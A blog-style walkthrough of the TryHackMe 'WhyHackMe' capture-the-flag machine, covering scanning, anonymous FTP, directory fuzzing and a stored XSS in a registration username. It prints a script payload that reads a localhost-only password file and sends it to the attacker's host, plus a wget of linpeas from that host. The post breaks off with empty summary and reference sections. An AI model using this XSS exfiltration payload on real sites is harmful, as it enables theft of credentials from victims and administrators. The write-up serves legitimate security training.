---
layout: post
title:  "TryHackMe | Whyhackme"
description: "Walkthrough of whyhackme machine, a Medium rated box from TryHackme"
date: "2024-11-11"
pin: true
image:
  path: ../assets/img/ctf/tryhackme/whyhackme1.png
  alt: "whyhackme.thm"
category: "TryHackMe"
tags: ["ThyHackMe", "Stored XSS", "Iptables Rules", "TLS Traffic Decryption"]
---
## Introduction
------------------------------------------------------------------------------------------
[WhyHackMe](https://tryhackme.com/r/room/whyhackme) is a medium rated linux box from tryhackme. It has 3 ports opens 21 running ftp, 22 running ssh and 80 running a web application. The foothold consist of exploiting a stored XSS vulnerability to exfiltrate a critical file that can be dicovered on the ftp server. The privilege escalation part involve playing with ipatables rules and decrypting some TLS traffic to access a backdoor runing on a particular port. From here get a reverse shell as www-data who his allowed to run any command as root without a password.

------------------------------------------------------------------------------------------

## Enumeration
We start by full scan to discover all tcp opened ports...
### All Open Ports
```bash
rustscan -a 10.10.4.243
```

```text
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.47 seconds
           Raw packets sent: 7 (284B) | Rcvd: 4 (160B)
```
### Services Scanning
```bash
nmap -p21,22,80 -sC -sV -oN whyhackme.full 10.10.4.243
```

```text
Nmap scan report for 10.10.4.243
Host is up (0.058s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.9.2.138
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.99 seconds
```
### Hostname
```bash
echo '10.10.4.243   whyhackme.thm' >> /etc/hosts
```

## FootHold
### Port 21
Since we have anonymous access on the ftp server let's check what we can find there.
```bash
ftp whyhackme.thm
```
![ftp access](./assets/img/ctf/tryhackme/whyhackme2.png)

```text
└─# cat update.txt       
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account. 

- admin
```
The update.txt file contains an admin message telling that the new account creds can be find at 127.0.0.1/dir/pass.txt, however this is only accessible from localhost.

### Port 80
![web root](./assets/img/ctf/tryhackme/whyhackme3.png)
```bash
ffuf -c -u http://whyhackme.thm/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php
```

```text
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://whyhackme.thm/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .php 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 58ms]
assets                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 55ms]
blog.php                [Status: 200, Size: 3102, Words: 422, Lines: 23, Duration: 54ms]
.php                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 8150ms]
.htpasswd.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 8583ms]
.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 8801ms]
.htaccess.php           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9094ms]
.hta.php                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 9471ms]
cgi-bin/                [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 55ms]
cgi-bin/.php            [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 58ms]
                        [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 54ms]
.hta                    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 54ms]
config.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 56ms]
dir                     [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 61ms]
index.php               [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 66ms]
index.php               [Status: 200, Size: 563, Words: 39, Lines: 30, Duration: 68ms]
login.php               [Status: 200, Size: 523, Words: 45, Lines: 21, Duration: 59ms]
logout.php              [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 57ms]
register.php            [Status: 200, Size: 643, Words: 36, Lines: 23, Duration: 64ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 60ms]
```
![registration](./assets/img/ctf/tryhackme/whyhackme4.png)
One registered, we can login at `/login.php`. After loged in we can access the blog page where we are allowed to add comments. Let's try adding a comment... 
![blog](./assets/img/ctf/tryhackme/whyhackme9.png)
As we can see, our comment get obviously saved on the server and can be viewed by all the users. We can test for xss there but also in the username field of the registration page since our username also get displayed back.
After trying, i got my xss payload from the username field executed...
![no xss](./assets/img/ctf/tryhackme/whyhackme10.png)
![xss-malicioususer](./assets/img/ctf/tryhackme/whyhackme11.png)
![xss-poc](./assets/img/ctf/tryhackme/whyhackme12.png)
How can we leverage this xss? The admin comment on the blog: `Hey people, I will be monitoring your comments so please be safe and civil`, this suggest us that we can try to leverage this and steal the admin cookie so we can be can have admin access in the applicatin. I've tryied that but no success. However, a recall that we have gotten an admin note from the ftp server. Since we can't access the admin cookie but still can perform actions as admin and in our case i guess the admin is acccessing the blog from localhost. This gives us an opportunity using the xss to exfiltrate the pass.txt file.
```js
<script>fetch("http://127.0.0.1/dir/pass.txt").then(r => r.text()).then(t => fetch("http://10.9.2.138/?q="+t,{mode:"no-cors"}))</script>
```
![exfiltration](./assets/img/ctf/tryhackme/whyhackme13.png)

### Port 22
```bash
ssh jack@whyhackme.thm
```
![registration](./assets/img/ctf/tryhackme/whyhackme5.png)


## Privilege Escalation
```bash
wget http://10.9.2.138/linpeas.sh
./linpeas.sh
```
![sudo -l](./assets/img/ctf/tryhackme/whyhackme6.png)
![another vhost](./assets/img/ctf/tryhackme/whyhackme7.png)
![opt folder](./assets/img/ctf/tryhackme/whyhackme8.png)


## Kill Chain Summary


## References